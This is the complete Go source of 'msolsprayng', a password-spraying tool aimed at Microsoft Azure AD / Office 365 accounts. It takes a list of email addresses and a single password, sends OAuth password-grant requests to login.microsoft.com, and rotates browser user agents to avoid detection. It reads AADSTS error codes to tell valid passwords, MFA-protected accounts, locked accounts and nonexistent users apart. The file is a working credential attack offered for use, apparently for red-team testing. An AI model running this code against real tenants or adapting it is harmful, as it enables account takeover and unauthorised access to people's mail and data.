package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

// Struct for the job results
type result struct {
	Succsessful bool   `json:"Successful"`
	Email       string `json:"Email"`
	Password    string `json:"Password"`
	ErrorCode   string `json:"ErrorCode"`
	ErrorMsg    string `json:"ErrorMsg"`
}

// Struct for the response from the GraphQL API if there is a unknown error
type graphQLError struct {
	Error            string `json:"error"`
	ErrorDescription string `json:"error_description"`
	ErrorCodes       []int  `json:"error_codes"`
	Timestamp        string `json:"timestamp"`
	TraceID          string `json:"trace_id"`
	CorrelationID    string `json:"correlation_id"`
	ErrorURI         string `json:"error_uri"`
}

var (
	// To count how many accounts were successfully sprayed
	successfull = 0
	// To count how many accounts are blocked
	locked = 0
	// To make sure emails dont get sprayed twice
	emails []string
	// For the args
	flagUserList     string
	flagPasswordFile string
	flagPassword     string
	flagOutFile      string
	flagrunnerCount  int
	flagJSON         bool
	flagVerbose      bool
)

// printVerbose() will print a string if flagVerbose was parsed true
func printVerbose(msg string) {
	if flagVerbose {
		fmt.Println(msg)
	}
}

// catchError() will do cheap error handling
//
// level = {crit, usage, normal}
func catchError(err error, level string) {
	switch level {
	case "critical":
		fmt.Printf("CRITICAL: %s, exiting\n", err)
		os.Exit(1)
	case "usage":
		fmt.Printf("ERROR: %s\n\n", err)
		flag.Usage()
		os.Exit(1)
	case "normal":
		// Only print normal errors if not in JSON mode
		if !flagJSON {
			fmt.Printf("ERROR: %s\n", err)
		}
	default:
		fmt.Printf("CRITICAL: invalid 'level' for catchError()\n")
		os.Exit(1)
	}
}

// contains() will return true if a []string contains a string
func contains(a []string, s string) bool {
	for _, e := range a {
		if e == s {
			return true
		}
	}

	return false
}

// fileAppendLine() will append a line to a file
func fileAppendLine(filename string, line string) (err error) {
	// Open file
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0755)
	if err != nil {
		return err
	}

	defer file.Close()

	// Write line
	if _, err = file.WriteString(fmt.Sprintf("%s\n", line)); err != nil {
		return err
	}

	return nil
}

// isValidEmail() will return true is a email is valid
//
// The validation is done via regex and len (5-255 chars)
func isValidEmail(email string) bool {
	emailRegex := regexp.MustCompile("^[a-zA-Z0-9.!#$%&'*+\\/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$")

	// Email length is 5-255 chars
	if len(email) < 5 {
		return false
	} else if len(email) > 255 {
		return false
	} else if !emailRegex.MatchString(email) {
		return false
	}

	return true
}

// randomUserAgent() returns a random desktop user-agent
func randomUserAgent() string {
	desktopAll := []string{
		// Chrome Windows
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		// Firefox Windows
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0",
		// Edge Windows
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/107.0.1418.62",
		// Opera Windows
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21",
		"Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21",
		// Chrome macOS
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		// Firefox macOS
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0; rv:107.0) Gecko/20100101 Firefox/107.0",
		// Safari macOS
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
		// Edge macOS
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edg/107.0.1418.62",
		// Opera macOS
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21",
		// Chrome Linux
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
		// Firefox Linux
		"Mozilla/5.0 (X11; Linux i686; rv:107.0) Gecko/20100101 Firefox/107.0",
		"Mozilla/5.0 (X11; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:107.0) Gecko/20100101 Firefox/107.0",
		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
		"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0",
		// Opera Linux
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 OPR/93.0.4585.21",
	}

	// Tnit rand
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	// Get an random int <= len(slice)
	i := r.Intn((len(desktopAll) - 0) + 0)
	// Return a string
	return desktopAll[i]
}

// ErrorCodeLookup() returns the meaning of a response code
func errorCodeLookup(response string) (code string, meaning string) {

	// Taken from the original repo https://github.com/dafthack/MSOLSpray
	// https://docs.microsoft.com/en-us/azure/active-directory/develop/reference-aadsts-error-codes
	if strings.Contains(response, "AADSTS50126") {
		return "AADSTS50126", "Invalid Password"

	} else if strings.Contains(response, "AADSTS50128") {
		return "AADSTS50128", "Tenant not found"

	} else if strings.Contains(response, "AADSTS50059") {
		return "AADSTS50059", "Tenant not found"

	} else if strings.Contains(response, "AADSTS50034") {
		return "AADSTS50034", "User does not exist"

	} else if strings.Contains(response, "AADSTS50079") {
		return "AADSTS50079", "Password correct but MFA present"

	} else if strings.Contains(response, "AADSTS50076") {
		return "AADSTS50076", "Password correct but MFA present"

	} else if strings.Contains(response, "AADSTS50158") {
		return "AADSTS50158", "Password correct but MFA & Conditional Access Policy present"

	} else if strings.Contains(response, "AADSTS53003") {
		// Thanks to https://github.com/mgeeky
		return "AADSTS53003", "Password correct but Conditional Access Policy present"

	} else if strings.Contains(response, "AADSTS50053") {
		locked++
		return "AADSTS50053", "Account locked"

	} else if strings.Contains(response, "AADSTS50057") {
		return "AADSTS50057", "Account disabled"

	} else if strings.Contains(response, "AADSTS50055") {
		return "AADSTS50055", "Password correct but expired"
	}

	// Got unknown error, unmarshal JSON response
	var jsonResponse graphQLError
	if err := json.Unmarshal([]byte(response), &jsonResponse); err != nil {
		catchError(err, "normal")
	}

	// Return the first error code and the first line of the error message
	return fmt.Sprintf("AADSTS%d", jsonResponse.ErrorCodes[0]), strings.Split(jsonResponse.ErrorDescription, "\r\n")[0]
}

// sprayerRunner() is a go func that sprays MS GraphQL
// with a password an a job list of email addresses
func sprayerRunner(wg *sync.WaitGroup, chanJobs <-chan string, chanResults chan<- result) {
	defer wg.Done()

	// Setup http client with a timeout of 10s
	client := &http.Client{
		Timeout: time.Second * 10,
	}

	// For each email
	for email := range chanJobs {

		// Make sure that the program exists if there are to many locked accounts
		if locked >= 10 {
			catchError(fmt.Errorf("10 or more accounts are locked. Your IP has probably been blocked by Microsoft, quitting"), "crit")
		}

		// Set the request body
		body := url.Values{}
		body.Set("resource", "https://graph.windows.net")
		body.Set("client_id", "1b730954-1685-4b74-9bfd-dac224a7b894") // Static ID
		body.Set("client_info", "1")
		body.Set("grant_type", "password")
		body.Set("username", email)
		body.Set("password", flagPassword)
		body.Set("scope", "openid")

		// Create the request
		request, err := http.NewRequest("POST", "https://login.microsoft.com/common/oauth2/token", bytes.NewBufferString(body.Encode()))
		request.Header.Set("Accept", "application/json")
		request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		request.Header.Set("User-Agent", randomUserAgent())
		if err != nil {
			catchError(fmt.Errorf("there as an error while creating the request for %s", email), "normal")
			// Skip to next job
			continue
		}

		response, err := client.Do(request)
		if err != nil {
			catchError(fmt.Errorf("there as an error while spraying at %s", email), "normal")
			// Skip to next job
			continue
		}

		if response.StatusCode == 200 {
			// Login successful
			successfull++

			chanResults <- result{
				Succsessful: true,
				Email:       email,
				Password:    flagPassword,
				ErrorCode:   "",
				ErrorMsg:    "",
			}

		} else {
			// Login not successful
			responseBytes, err := io.ReadAll(response.Body)
			if err != nil {
				catchError(fmt.Errorf("there as an error while parsing the response for %s", email), "normal")
				// Skip to next job
				continue
			}

			// Lookup meaning of the message
			errorcode, errormsg := errorCodeLookup(string(responseBytes))
			// Send result ot the channel
			chanResults <- result{
				Succsessful: false,
				Email:       email,
				Password:    flagPassword,
				ErrorCode:   errorcode,
				ErrorMsg:    errormsg,
			}
		}
	}
}

// resultsRunner() handels the results
func resultsRunner(wg *sync.WaitGroup, chanResults <-chan result) {
	defer wg.Done()

	// For each results
	for result := range chanResults {
		if flagJSON {
			// Format to JSON
			jsonResult, err := json.Marshal(result)
			if err != nil {
				catchError(fmt.Errorf("error while converting result to JSON"), "crit")
			}

			// Print as JSON
			fmt.Printf("%s\n", string(jsonResult))
			// Append if selected
			if flagOutFile != "" {
				fileAppendLine(flagOutFile, string(jsonResult))
			}

		} else if result.Succsessful {
			// Print successful
			fmt.Printf("[+] %s %s\n", result.Email, "SUCCESS")
			// Append if selected
			if flagOutFile != "" {
				fileAppendLine(flagOutFile, fmt.Sprintf("[+] %s %s", result.Email, "SUCCESS"))
			}

		} else if !result.Succsessful {
			// Print not successful
			fmt.Printf("[-] %s %s\n", result.Email, result.ErrorMsg)
			// Append if selected
			if flagOutFile != "" {
				fileAppendLine(flagOutFile, fmt.Sprintf("[-] %s %s", result.Email, result.ErrorMsg))
			}
		}
	}
}

func main() {
	// To measure execution time
	startTime := time.Now()

	// Parse args
	flag.StringVar(&flagUserList, "u", "", "")
	flag.StringVar(&flagPasswordFile, "p", "", "")
	flag.StringVar(&flagPassword, "P", "", "")
	flag.StringVar(&flagOutFile, "o", "", "")
	flag.IntVar(&flagrunnerCount, "w", 1, "")
	flag.BoolVar(&flagJSON, "j", false, "")
	flag.BoolVar(&flagVerbose, "v", false, "")
	flag.Usage = func() {
		fmt.Printf(`usage: msolsprayng -u users.txt -P "Summer2023" [OPTIONS]

Options:
    -u = Path to file containing E-Mail addresses to be sprayed
    -p = Path to file containing the password to spray (will use first line)
    -P = Password to spray (argument)
    -w = Amount of runners/threads (optional, default: 1, max. 3)
    -o = Output file name (optional)
    -j = Format output & log as JSON (optional, overwrites -v)
    -v = Verbose mode (optional, overriden by -j)

Examples:
    msolsprayng -u users.txt -P "Summer2023"
    msolsprayng -u users.txt -P "Summer2023" -j -o results.json
    msolsprayng -u users.txt -p password.txt -o results.txt
    msolsprayng -u users.txt -p password.txt -v -w 3

`)
	}
	flag.Parse()

	printVerbose("msolsprayng by https://github.com/rtfmkiesel\nOriginal by https://github.com/dafthack\n")

	// Check flags
	if flagUserList == "" {
		// -u is required
		catchError(fmt.Errorf("missing argument '-u'"), "usage")
	} else if flagPassword != "" && flagPasswordFile != "" {
		// Only -p or -P
		catchError(fmt.Errorf("only one password argument ('-p' or '-P') required"), "usage")
	} else if flagPassword == "" && flagPasswordFile == "" {
		// Ff no -p or -P
		catchError(fmt.Errorf("missing argument '-p' or '-P'"), "usage")
	} else if flagrunnerCount > 3 {
		// Alert if -w is higher than 3
		// Will get you blocked to fast
		printVerbose(fmt.Sprintf("Max value for '-w' is 3. Reducing %d to 3.", flagrunnerCount))
		flagrunnerCount = 3
	} else if flagJSON {
		// If JSON is wanted, verbose needs to be disabled
		flagVerbose = false
	}

	// Load password from file if selected
	if flagPasswordFile != "" {
		// Check if file exists
		_, err := os.Stat(flagPasswordFile)
		if os.IsNotExist(err) {
			catchError(fmt.Errorf("file %s does not exist", flagPasswordFile), "crit")
		}

		// Open file
		file, err := os.Open(flagPasswordFile)
		if err != nil {
			catchError(fmt.Errorf("error opening file %s", flagPasswordFile), "crit")
		}
		defer file.Close()

		// Read file
		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		scanner.Scan()
		flagPassword = scanner.Text()

		printVerbose(fmt.Sprintf("Using password: %s", flagPassword))
	}

	// Load input file
	// Check if file exists
	_, err := os.Stat(flagUserList)
	if os.IsNotExist(err) {
		catchError(fmt.Errorf("file %s does not exist", flagUserList), "crit")
	}

	// Open file
	file, err := os.Open(flagUserList)
	if err != nil {
		catchError(fmt.Errorf("error opening file %s", flagUserList), "crit")
	}
	defer file.Close()

	// Read file
	s := bufio.NewScanner(file)
	s.Split(bufio.ScanLines)

	// For each line (user)
	for s.Scan() {
		// Normalize
		email := strings.ToLower(s.Text())

		// Only process if email is new
		if !contains(emails, email) {
			// Only append if valid email
			if isValidEmail(email) {
				emails = append(emails, email)
			} else {
				printVerbose(fmt.Sprintf("Ignoring %s, invalid email", email))
			}
		} else {
			printVerbose(fmt.Sprintf("Ignoring %s, duplicate", email))
		}
	}

	// Check if there are accounts to spray
	if len(emails) == 0 {
		catchError(fmt.Errorf("no valid emails supplied"), "crit")
	} else {
		printVerbose(fmt.Sprintf("Spraying %d users", len(emails)))
	}

	// Check is output file does not exist
	_, err = os.Stat(flagOutFile)
	if !os.IsNotExist(err) {
		// Output file already exists, rename with timestamp
		flagOutFile = fmt.Sprintf("%s_msolsprayng.log", time.Now().Format("20060102_150405"))
		printVerbose(fmt.Sprintf("Output file already exists, saving as %s\n", flagOutFile))
	}

	// Set up result channel & waitgroup for the results
	chanResults := make(chan result)
	wgResults := new(sync.WaitGroup)
	// Start the results runner
	go resultsRunner(wgResults, chanResults)
	wgResults.Add(1)

	// Set up jobs channel & waitgroup for the jobs
	chanJobs := make(chan string)
	wgSprayer := new(sync.WaitGroup)
	for runnerid := 0; runnerid < flagrunnerCount; runnerid++ {
		// Spawn sprayers
		go sprayerRunner(wgSprayer, chanJobs, chanResults)
		printVerbose(fmt.Sprintf("Created runner %d", runnerid))
		wgSprayer.Add(1)
	}

	// Add the emails to the job queue
	for _, email := range emails {
		chanJobs <- email
	}

	// Starts the sprayers
	close(chanJobs)

	// Wait here for the sprayers to finish
	wgSprayer.Wait()

	// Close the results channel
	close(chanResults)

	// Wait for the results processing to finish
	wgResults.Wait()

	printVerbose(fmt.Sprintf("Done, %d successful logins, took %s", successfull, time.Since(startTime)))
	os.Exit(0)
}
